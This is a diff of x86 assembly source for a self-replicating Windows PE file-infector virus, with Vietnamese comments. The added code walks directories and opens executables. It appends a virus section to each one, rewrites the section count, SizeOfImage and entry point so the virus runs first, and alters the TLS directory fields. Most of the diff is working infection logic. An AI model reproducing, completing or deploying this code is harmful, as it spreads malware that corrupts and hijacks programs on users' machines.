@@ -276,11 +276,17 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	LOCAL nos_injected:word
 	LOCAL aop_virus:dword
 	LOCAL aop_injected:dword
-	LOCAL image_sz:dword
 	LOCAL anew:dword
 	LOCAL section[10]:dword
+	LOCAL section_final[10]:dword
 	LOCAL delta_aop:dword
 	LOCAL injected:dword
+	LOCAL sec_align:dword
+	LOCAL file_align:dword
+	LOCAL imagesz:dword
+	LOCAL aop:dword
+	LOCAL tmp_4:dword
+	
 	
 	xor		eax, eax
 	lea		eax, path_file_current
@@ -308,15 +314,16 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	push	80h					;normal
 	push	3					;OPEN_EXISTING
 	push	0
-	push	00000003h			;read va write
-	push	0C0000000h			;read va write
+	push	00000001h			;read va write
+	push	080000000h			;read va write
 	push	eax					;pathtmp
 	call	ebx					;CreateFile
 	
 	
 	cmp 	eax, 0ffffffffh
 	je		end_inject_file
-	mov		this_file_virus_handle, eax
+	lea		ecx, this_file_virus_handle
+	mov		[ecx], eax
 	xor		ebx, ebx
 	mov		ebx, 60
 	
@@ -331,10 +338,14 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	mov		edx, del
 	add		edx, offset rf
 	mov		edx, [edx]
+	lea		eax, this_file_virus_handle
+	mov		eax, [eax]
+	
+	push	ebx
 	push	0
 	push	4							;4 byte
 	push	ecx							;buffer
-	push	this_file_virus_handle		;handle
+	push	eax							;handle
 	call	edx 						;ReadFile
 	
 	mov		ebx, inject_tmp
@@ -351,11 +362,14 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	add		edx, offset rf
 	mov		edx, [edx]
 	
+	lea		eax, this_file_virus_handle
+	mov		eax, [eax]
+	
 	push	ebx
 	push	0
 	push	2							;4 byte
 	push	ecx							;buffer
-	push	this_file_virus_handle		;handle
+	push	eax							;handle
 	call	edx							;ReadFile
 	
 	mov		ebx, inject_tmp
@@ -392,7 +406,7 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	mov		dword ptr [eax], edx
 	push	ecx
 	push	edx
-	;read AddressOfEntryPoint
+	;read section
 	lea		ebx, ov
 	lea		ecx, section
 
@@ -433,7 +447,7 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	push	40							;40 byte
 	push	ecx							;buffer
 	push	this_file_virus_handle		;handle
-	call	edx 						;ReadFile
+	call	edx 						;ReadFile section exec in section table
 	
 	mov		eax, [section+0ch]
 	mov		ebx, aop_virus
@@ -453,11 +467,57 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	
 	push	ebx
 	push	0
-	push	4							;40 byte
+	push	4							;4 byte
 	push	ecx							;buffer
 	push	handleF						;handle
-	call	edx							;ReadFile
+	call	edx							;ReadFile e_lfanew
 	
+	;doc filealignment va sectionalignment
+	
+	xor		eax, eax
+	mov		eax, injected
+	add		eax, 38h
+	
+	lea		edx, rf
+	add		edx, del
+	mov		edx, [edx]			; readfile
+	
+	lea		ebx, ov
+	add		ebx, 8
+	mov		[ebx], eax
+	lea		ebx, ov
+	lea		eax, sec_align
+	
+	push	ebx
+	push 	0
+	push	4
+	push	eax
+	push	handleF
+	call	edx					;read sectionalignment
+	
+	
+	xor		eax, eax
+	mov		eax, injected
+	add		eax, 3ch
+	
+	lea		edx, rf
+	add		edx, del
+	mov		edx, [edx]			; readfile
+	
+	lea		ebx, ov
+	add		ebx, 8
+	mov		[ebx], eax
+	lea		ebx, ov
+	lea		eax, file_align
+	
+	push	ebx
+	push 	0
+	push	4
+	push	eax
+	push	handleF
+	call	edx					;readfile filealignment
+	
+	;doc so section cua file bi lay
 	mov		ebx, injected
 	lea		eax, ov
 	add		eax, 8h	
@@ -466,46 +526,296 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	
 	lea		ebx, ov
 	lea		ecx, nos_injected
-	;doc so section cua file bi lay
+	
 	lea		edx, rf
 	add		edx, del
 	mov		edx, [edx]
 	
 	push	ebx
 	push	0
-	push	2							;40 byte
+	push	2							;2 byte
 	push	ecx							;buffer
 	push	handleF						;handle
-	call	edx							;ReadFile
+	call	edx							;ReadFile numberofsection
 	
+	
+	;doc thong tin section cuoi trong sectiontable
 	xor		eax, eax
 	mov		ax, nos_injected
-	mov		bl, 40
-	mul		bl
-	mov		ebx, injected
-	add		ebx, 0f8h
+	dec		ax
+	mov		cl, 28h
+	mul		cl	
+	
+	xor		ecx, ecx
+	mov		ecx, injected
+	add		ecx, 0f8h
+	add		ecx, eax
+	
+	
+	lea		edx, rf
+	add		edx, del
+	mov		edx, [edx]			; readfile
+	
+	lea		ebx, ov
+	add		ebx, 8
+	mov		[ebx], ecx
+	lea		ebx, ov
+	lea		eax, section_final
+	
+	push	ebx
+	push 	0
+	push	28h
+	push	eax
+	push	handleF
+	call	edx					;read sectionalignment
+	
+	
+	
+	;Doc AddressOfEntryPoint cua file bi lay
+	
+	xor 	eax, eax
+	mov		eax, injected
+	add		eax, 28h
+	
+	lea		ebx, rf
+	add		ebx, del
+	mov		ebx, [ebx]
+	
+	lea		ecx, ov
+	add		ecx, 8
+	mov		dword ptr [ecx], eax
+	lea		ecx, ov
+	
+	lea		edx, aop_injected
+	
+	push	ecx
+	push 	0
+	push	4
+	push	edx
+	push	handleF
+	call	ebx				;readfile addressofentrypoint cua file bi lay
+	
+	
+	;chinh thong tin section chua virus truoc khi lay
+	
+	lea		eax, section_final
+	add		eax, 10h
+	
+	mov		ebx, dword ptr [eax]
+	add		eax, 4
+	mov		eax, dword ptr [eax]
 	add		ebx, eax
 	
-	lea		edx, ov
-	add		edx, 8
-	mov		dword ptr [edx], ebx
-	lea		edx, ov 
+	mov		ecx, file_align
+	raw_address:
+	add		eax, ecx
+	cmp		eax, ebx
+	jae		done_raw_address
+	jmp		raw_address
+	
+	done_raw_address:
+	lea		ebx, section
+	add		ebx, 14h
+	mov		dword ptr [ebx], eax	;sua raw address
+	
+	;-----------------
+	lea		eax, section_final
+	add		eax, 8h
+	
+	mov		ebx, dword ptr [eax]
+	add		eax, 4h
+	mov		eax, dword ptr [eax]
+	add		ebx, eax
+	
+	mov		ecx, sec_align
+	vir_address:
+	add		eax, ecx
+	cmp		eax, ebx
+	jae		done_vir_address
+	jmp		vir_address
+	
+	done_vir_address:
+	lea		ebx, section
+	add		ebx, 0ch
+	mov		dword ptr [ebx], eax	;sua virtual address
+	
+	;ghi them section vua sua vao cuoi bang section
+	xor		ebx, ebx
+	mov		bx, nos_injected
+	mov		al, 28h
+	mul		bx
+	
+	mov		ebx, eax
+	xor		eax, eax
+	mov		eax, injected
+	add		eax, 0f8h
+	add		eax, ebx
+	
+	lea		edx, wf
+	add		edx, del
+	mov		edx, [edx]			; writefile
+	
+	lea		ebx, ov
+	add		ebx, 8
+	mov		[ebx], eax
+	lea		ebx, ov
 	lea		eax, section
 	
+	push	ebx
+	push 	0
+	push	28h
+	push	eax
+	push	handleF
+	call	edx					;writefile imagesize
+	
+	
+	;Sua numberofsection
+	xor		eax, eax
+	mov		ax, nos_injected
+	inc		ax
+	mov		nos_injected, ax			;tang section len 1
+	
+	lea		edx, wf
+	add		edx, del
+	mov		edx, [edx]
+	
+	mov		ebx, injected
+	lea		eax, ov
+	add		eax, 8h	
+	add		ebx, 6				
+	mov		dword ptr [eax], ebx
+	
+	lea		ebx, ov
+	lea 	ecx, nos_injected
+	
+	push 	ebx
+	push	0
+	push	2
+	push	ecx
+	push	handleF
+	call	edx							;writefile sua numberofsection
+	
+	;lay sizeofimage
+	
+	lea		ebx, section
+	add		ebx, 8h
+	
+	mov		eax, [ebx]
+	add		ebx, 4
+	mov		ebx, [ebx]
+	add		eax, ebx
+	
+	mov		ecx, sec_align
+	image_sz:
+	add		ebx, ecx
+	cmp 	ebx, eax
+	jb		image_sz
+	lea		eax, imagesz
+	mov		[eax], ebx
+	
+	;sua image size
+	xor		eax, eax
+	mov		eax, injected
+	add		eax, 50h
+	
+	lea		edx, wf
+	add		edx, del
+	mov		edx, [edx]			; writefile
+	
+	lea		ebx, ov
+	add		ebx, 8
+	mov		[ebx], eax
+	lea		ebx, ov
+	lea		eax, imagesz
+	
+	push	ebx
+	push 	0
+	push	4
+	push	eax
+	push	handleF
+	call	edx					;writefile imagesize
+	
+	
+	;ghi addressofentrypoint moi
+	lea		eax, section
+	add		eax, 0ch
+	mov		ebx, [eax]
+	add		ebx, delta_aop
+	
+	lea		eax, aop
+	mov		[eax], ebx
+	
+	xor 	eax, eax
+	mov		eax, injected
+	add		eax, 28h
 	
 	lea		ebx, wf
 	add		ebx, del
 	mov		ebx, [ebx]
 	
+	lea		ecx, ov
+	add		ecx, 8
+	mov		dword ptr [ecx], eax
+	lea		ecx, ov
+	
+	lea		edx, aop
+	
+	push	ecx
+	push 	0
+	push	4
 	push	edx
-	push	0
-	push	40
-	push	eax
 	push	handleF
-	call	ebx				
+	call	ebx				;writefile addressofentrypoint cua file bi lay
 	
+	;sua tls 
+	xor		ebx, ebx
+	lea		eax, tmp_4
+	mov		[eax], ebx
+	xor 	eax, eax
+	mov		eax, injected
+	add		eax, 0c0h
 	
+	lea		ebx, wf
+	add		ebx, del
+	mov		ebx, [ebx]
 	
+	lea		ecx, ov
+	add		ecx, 8
+	mov		dword ptr [ecx], eax
+	lea		ecx, ov
+	lea		edx, tmp_4
+	
+	push	ecx
+	push 	0
+	push	4
+	push	edx
+	push	handleF
+	call	ebx	
+	
+	;sua tls size
+	
+	xor 	eax, eax
+	mov		eax, injected
+	add		eax, 0c4h
+	
+	lea		ebx, wf
+	add		ebx, del
+	mov		ebx, [ebx]
+	
+	lea		ecx, ov
+	add		ecx, 8
+	mov		dword ptr [ecx], eax
+	lea		ecx, ov
+	lea		edx, aop_virus
+	
+	push	ecx
+	push 	0
+	push	4
+	push	edx
+	push	handleF
+	call	ebx					;writefile
+	
+	;Them Section vao cuoi file
 	
 	end_inject_file:
 	ret
@@ -543,8 +853,15 @@ push	ecx					;pathFile
 push	edx					;pathtmp
 call	ebx					;call lstrcpy
 
+mov		eax, del
+add		eax, offset strlen
+mov		eax, [eax]
+lea		edx, pathtmp
 
-mov		ebx, pathFile
+push	edx
+call	eax
+
+lea		ebx, pathtmp
 add		ebx, eax
 mov		al, 5ch
 mov		[ebx], al
@@ -556,7 +873,7 @@ mov		ecx, del
 add		ecx, offset fff
 mov		eax, [ecx]
 
-mov		ebx, pathFile
+lea		ebx, pathtmp
 
 mov		ecx, del
 add		ecx, offset dwFileAttributes
@@ -566,7 +883,7 @@ push	ecx			;WIN32_FIND_DATAA
 push	ebx			;pathFile
 call 	eax			;FindFirstFile
 
-cmp		eax, -1
+cmp		eax, 0ffffffffh
 jz		done_find
 
 lea		ecx, hfind
@@ -604,8 +921,8 @@ add		ecx, eax
 mov		edx, del
 add		edx, offset cFileName
 		
-push	ecx					;pathtmp[eax]
-push	edx					;cFileName
+push	edx					;pathtmp[eax]
+push	ecx					;cFileName
 call	ebx					;call lstrcpy
 
 lea		eax, pathtmp
@@ -663,6 +980,7 @@ push	ebx
 call 	inject_file
 
 
+
 close_handle:
 
 mov		ebx, del
@@ -673,6 +991,55 @@ add		ecx, offset clh
 mov		ecx, [ecx]
 push	ebx						;h_file
 call	ecx						;closehandle
+
+xor		ebx, ebx
+mov		eax, del
+add		eax, offset msz
+mov		eax, [eax]
+mov		ebx, 262
+lea		ecx, pathtmp
+
+push	ebx			;size
+push	ecx			;buff
+call 	eax			;call RtlZeroMemory
+
+mov		ebx, del
+add		ebx, offset strcpy
+mov		ebx, [ebx]
+mov		ecx, pathFile		
+lea		edx, pathtmp
+push	ecx					;pathFile
+push	edx					;pathtmp
+call	ebx					;call lstrcpy
+
+mov		eax, del
+add		eax, offset strlen
+mov		eax, [eax]
+lea		edx, pathtmp
+
+push	edx
+call	eax
+
+lea		ebx, pathtmp
+add		ebx, eax
+mov		al, 5ch
+mov		[ebx], al
+inc		ebx
+mov		al, 2ah
+mov		[ebx], al
+
+xor		ebx, ebx
+mov		eax, del
+add		eax, offset msz
+mov		eax, [eax]
+
+mov		ecx, del
+add		ecx, offset tmp
+mov		ebx, 4
+
+push	ebx			;size
+push	ecx			;buff
+call 	eax			;call RtlZeroMemory
 
 jmp		next_file
 
@@ -718,23 +1085,8 @@ call	ebx					;call lstrcpy
 mov		eax, del
 add		eax, offset strlen
 mov		eax, [eax]
-
-lea		ebx, pathtmp
-push	ebx					;string
-call 	eax					;call lstrlen
-
-dec		eax
-lea		ebx, pathtmp
-add		ebx, eax
-mov		al, 5ch
-mov		[ebx], al
-inc		ebx
-mov		al, 2ah
-mov		[ebx], al
-
 xor		eax, eax
 mov		eax, del
-
 lea		ebx, pathtmp
 
 push	eax
@@ -745,16 +1097,6 @@ call	browse_files
 ;------------------
 
 next_file:
-
-
-;mov		ebx, del
-;add		ebx, offset h_file
-;mov		ebx, [ebx]
-;mov		ecx, del
-;add		ecx, offset clh
-;mov		ecx, [ecx]
-;push	ebx						;h_file
-;call	ecx						;closehandle
 
 xor		ebx, ebx
 mov		eax, del
@@ -826,7 +1168,7 @@ lib_user32		db "user32.dll", 0
 virtualprotect	db "VirtualProtect", 0
 getpath			db "GetCurrentDirectoryA", 0
 createfile 		db "CreateFileA", 0
-getpathfile		db "GetModuleFileName", 0
+getpathfile		db "GetModuleFileNameA", 0
 
 memsetzero		db "RtlZeroMemory", 0
 len				db "lstrlenA", 0
